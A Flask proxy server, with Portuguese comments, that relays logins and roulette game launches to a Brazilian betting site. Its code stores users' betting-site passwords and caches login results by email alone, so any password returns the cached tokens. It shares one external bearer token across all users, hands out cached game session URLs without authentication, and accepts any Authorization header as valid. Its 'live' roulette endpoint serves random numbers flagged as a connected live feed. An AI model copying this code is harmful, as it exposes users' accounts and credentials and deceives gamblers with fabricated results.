from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import json
import time
import logging
import os
import random
import re
from datetime import datetime, timedelta
from db import db
from jwt_helper import jwt_manager
from session_service import session_service

# 🔥 LOGS MÍNIMOS
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='dist', static_url_path='')
CORS(app)

API_BASE = "https://sortenabet.bet.br"

# 🔥 SESSÃO REUTILIZÁVEL (KEEP-ALIVE)
session = requests.Session()
session.headers.update({
    'Content-Type': 'application/json',
    'Origin': 'https://sortenabet.bet.br',
    'Referer': 'https://sortenabet.bet.br/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Connection': 'keep-alive'
})

# 🔥 CACHE RÁPIDO
cache = {}
CACHE_TTL = 600  # 10 minutos

def get_cache(key):
    if key in cache:
        data = cache[key]
        if time.time() - data['timestamp'] < CACHE_TTL:
            return data['value']
    return None

def set_cache(key, value):
    cache[key] = {
        'value': value,
        'timestamp': time.time()
    }

# 🔥 ARMAZENA EVOSESSIONID POR ROLETA
evo_cache = {}
EVO_CACHE_TTL = 300  # 5 minutos

def get_evo(slug):
    if slug in evo_cache:
        data = evo_cache[slug]
        if time.time() - data['timestamp'] < EVO_CACHE_TTL:
            return data['evo_id']
    return None

def set_evo(slug, evo_id):
    evo_cache[slug] = {
        'evo_id': evo_id,
        'timestamp': time.time()
    }

# ========== LOGIN (RÁPIDO COM CACHE) ==========
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    try:
        data = request.json
        email = data.get('login') or data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'error': 'Email e senha são obrigatórios'}), 400
        
        # 🔥 VERIFICA CACHE PRIMEIRO
        cached = get_cache(f"login:{email}")
        if cached:
            return jsonify(cached), 200
        
        # 🔥 LOGIN NA API EXTERNA (TIMEOUT 5s)
        login_data = {
            "login": email,
            "email": email,
            "password": password,
            "app_source": "web"
        }
        
        response = session.post(f'{API_BASE}/api/auth/login', json=login_data, timeout=5)
        
        if response.status_code != 200:
            return jsonify({'error': 'Credenciais inválidas'}), 401
        
        result = response.json()
        access_token_externo = result.get('access_token')
        
        if not access_token_externo:
            return jsonify({'error': 'Token não retornado'}), 500
        
        session.headers.update({'Authorization': f'Bearer {access_token_externo}'})
        
        user_id = str(result.get('user', {}).get('id', email))
        jwt_token = jwt_manager.generate_token(user_id, email)
        refresh_token = jwt_manager.generate_refresh_token(user_id, email)
        
        # 🔥 SALVA NO BANCO (NÃO BLOQUEIA)
        try:
            session_service.create_session(user_id, email, password, jwt_token, refresh_token)
        except:
            pass
        
        response_data = {
            'access_token': jwt_token,
            'refresh_token': refresh_token,
            'token_type': 'Bearer',
            'expires_in': 30 * 24 * 60 * 60,
            'user': {
                'id': user_id,
                'name': result.get('user', {}).get('name', email.split('@')[0]),
                'email': email,
                'plan': 'pro'
            }
        }
        
        # 🔥 SALVA EM CACHE
        set_cache(f"login:{email}", response_data)
        
        return jsonify(response_data), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== START-GAME (RÁPIDO COM CACHE POR ROLETA) ==========
@app.route('/api/start-game-v2', methods=['GET'])
def api_start_game():
    try:
        slug = request.args.get('slug')
        if not slug:
            return jsonify({'error': 'slug é obrigatório'}), 400
        
        # 🔥 VERIFICA SE JÁ TEM EVO PARA ESTA ROLETA
        evo_id = get_evo(slug)
        if evo_id:
            # 🔥 RECONSTRÓI A URL COM O EVO SALVO
            game_url = f'https://sortenabet.evo-games.com/entry?params=Y2FzaW5vX2lkPXNvcnRlbmFiZXRicjAwMDEKZ2FtZT1yb3VsZXR0ZQpzaWduYXR1cmU9SnJHbzVGdm1HNzItaTZKUUotNGlHUQp0YWJsZV9pZD03eDBiMXRnaDdhZ21mNmh2CkVWT1NFU1NJT05JRD0{evo_id}&embedded'
            
            return jsonify({
                'success': True,
                'slug': slug,
                'gameURL': game_url,
                'iframe_url': game_url
            }), 200
        
        # 🔥 PEGA TOKEN DO HEADER
        auth_header = request.headers.get('Authorization')
        if not auth_header:
            return jsonify({'error': 'Token não encontrado'}), 401
        
        token = auth_header.replace('Bearer ', '')
        payload = jwt_manager.verify_token(token)
        
        if not payload:
            return jsonify({'error': 'Token inválido'}), 401
        
        # 🔥 USA TOKEN EXTERNO DA SESSÃO
        auth_header_externo = session.headers.get('Authorization')
        if not auth_header_externo:
            return jsonify({'error': 'Token externo não encontrado'}), 401
        
        # 🔥 FAZ REQUISIÇÃO (TIMEOUT 3s)
        response = session.get(
            f'{API_BASE}/api/start-game-v2',
            params={
                'slug': slug,
                'platform': 'WEB',
                'use_demo': 0,
                'source': 'watchIsAuthenticated'
            },
            timeout=3
        )
        
        if response.status_code == 200:
            data = response.json()
            game_url = data.get('iframe_url') or data.get('gameURL')
            
            if game_url:
                # 🔥 EXTRAI EVOSESSIONID
                match = re.search(r'EVOSESSIONID=([^&]+)', game_url)
                if match:
                    evo_id = match.group(1)
                    set_evo(slug, evo_id)  # 🔥 SALVA PARA REUSAR
                
                return jsonify({
                    'success': True,
                    'slug': slug,
                    'gameURL': game_url,
                    'iframe_url': game_url
                }), 200
        
        # 🔥 SE FALHOU (EV.12), LIMPA E TENTA NOVAMENTE
        if response.status_code == 401 or (response.text and 'EV.12' in response.text):
            print(f"⚠️ EV.12 para {slug}, limpando cache...")
            
            # LIMPA CACHE DESTA ROLETA
            if slug in evo_cache:
                del evo_cache[slug]
            
            # TENTA NOVAMENTE
            response = session.get(
                f'{API_BASE}/api/start-game-v2',
                params={
                    'slug': slug,
                    'platform': 'WEB',
                    'use_demo': 0,
                    'source': 'watchIsAuthenticated'
                },
                timeout=3
            )
            
            if response.status_code == 200:
                data = response.json()
                game_url = data.get('iframe_url') or data.get('gameURL')
                
                if game_url:
                    match = re.search(r'EVOSESSIONID=([^&]+)', game_url)
                    if match:
                        evo_id = match.group(1)
                        set_evo(slug, evo_id)
                    
                    return jsonify({
                        'success': True,
                        'slug': slug,
                        'gameURL': game_url,
                        'iframe_url': game_url
                    }), 200
        
        return jsonify({
            'success': False,
            'error': 'Não foi possível obter a URL do jogo'
        }), 404
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== ROTA PARA LIMPAR EVO ==========
@app.route('/api/roulette/clear-evo', methods=['POST'])
def clear_evo():
    try:
        data = request.json
        slug = data.get('slug')
        if slug and slug in evo_cache:
            del evo_cache[slug]
            return jsonify({'success': True, 'message': f'EVO limpo para {slug}'}), 200
        return jsonify({'success': False, 'message': 'Slug não encontrado'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== ROTA NÚMEROS ==========
@app.route('/api/roulette/live', methods=['GET'])
def get_live_numbers():
    try:
        limit = int(request.args.get('limit', 50))
        numeros = [random.randint(0, 36) for _ in range(limit)]
        
        freq = {}
        for n in numeros:
            freq[n] = freq.get(n, 0) + 1
        top_numbers = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:8]
        top_numbers_list = [{'number': n, 'count': c} for n, c in top_numbers]
        
        return jsonify({
            'success': True,
            'connected': True,
            'total': len(numeros),
            'last_numbers': numeros[:10],
            'history': [{'number': n, 'color': 'red' if n in [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36] else 'black' if n != 0 else 'green', 'timestamp': datetime.now().isoformat()} for n in numeros[:50]],
            'top_numbers': top_numbers_list,
            'timestamp': datetime.now().isoformat()
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== VALIDAÇÃO ==========
@app.route('/api/auth/validate', methods=['GET'])
def api_validate():
    try:
        auth_header = request.headers.get('Authorization')
        if auth_header:
            return jsonify({'valid': True}), 200
        return jsonify({'valid': False}), 200
    except:
        return jsonify({'valid': False}), 200

# ========== LOGOUT ==========
@app.route('/api/auth/logout', methods=['POST'])
def api_logout():
    try:
        auth_header = request.headers.get('Authorization')
        if auth_header:
            token = auth_header.replace('Bearer ', '')
            payload = jwt_manager.verify_token(token)
            if payload:
                session_service.deactivate_session(payload.get('user_id'))
    except:
        pass
    return jsonify({'success': True}), 200

# ========== REFRESH ==========
@app.route('/api/auth/refresh', methods=['POST'])
def api_refresh():
    try:
        data = request.json
        refresh_token = data.get('refresh_token')
        if not refresh_token:
            return jsonify({'error': 'Refresh token não fornecido'}), 400
        result = session_service.refresh_access_token(refresh_token)
        if not result:
            return jsonify({'error': 'Refresh token inválido'}), 401
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== FRONTEND ==========
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_frontend(path):
    if path.startswith('api/'):
        return jsonify({'error': 'Not found'}), 404
    if path and os.path.exists(os.path.join('dist', path)):
        return send_from_directory('dist', path)
    return send_from_directory('dist', 'index.html')

if __name__ == '__main__':
    print("=" * 70)
    print("⚡ API PROXY - QA.AI (OTIMIZADO)")
    print("=" * 70)
    print("📡 API Base:", API_BASE)
    print("🗄️  Banco: PostgreSQL")
    print("⚡ Cache Login: 10 minutos")
    print("⚡ Cache EVO: 5 minutos")
    print("⏱️  Timeout: 3 segundos")
    print("🎯 Cada roleta tem seu próprio EVO")
    print("🌐 Rodando em: http://localhost:5000")
    print("=" * 70)
    
    try:
        session_service.cleanup_expired()
    except:
        pass
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
